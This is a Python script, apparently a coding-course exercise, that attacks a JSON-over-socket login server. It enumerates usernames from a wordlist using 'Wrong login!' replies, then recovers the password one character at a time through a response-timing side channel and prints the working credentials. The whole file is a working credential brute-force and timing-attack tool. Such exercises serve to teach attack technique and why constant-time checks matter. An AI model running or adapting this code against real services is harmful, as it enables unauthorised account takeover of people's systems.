import argparse
import json
import socket
import time

parser = argparse.ArgumentParser(description="This program connects to the server using an IP address and a port from "
                                             "the command line arguments.")
parser.add_argument("ip_address", help='IP address of the server to connect to')
parser.add_argument("port", type=int, help="Server socket port number")
args = parser.parse_args()
file = open('logins.txt', 'r')
logins = list(map(lambda x: x.strip(), file.readlines()))
abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
file.close()

def get_response_result(resp):
    return json.loads(resp)['result']

with socket.socket() as client_socket:
    address = (args.ip_address, int(args.port))
    client_socket.connect(address)

    break_loop = False
    for login in logins:

        hack_json = {"login": login, "password": ' '}
        json_str = json.dumps(hack_json)
        client_socket.send(json_str.encode())
        response = client_socket.recv(1024)

        if get_response_result(response) == 'Wrong login!':
            continue
        else:
            password = ''

            while True:
                for letter in list(abc):
                    hack_json = {"login": login, "password": password + letter}
                    json_str = json.dumps(hack_json)
                    client_socket.send(json_str.encode())
                    start = time.time()
                    response = client_socket.recv(1024)
                    end = time.time()
                    total_time = end - start
                    if get_response_result(response) == 'Wrong password!' and total_time >= 0.1:
                        password += letter
                    if get_response_result(response) == 'Connection success!':
                        break_loop = True
                        print(json_str)
                        break
                if break_loop:
                    break

        if break_loop:
            break


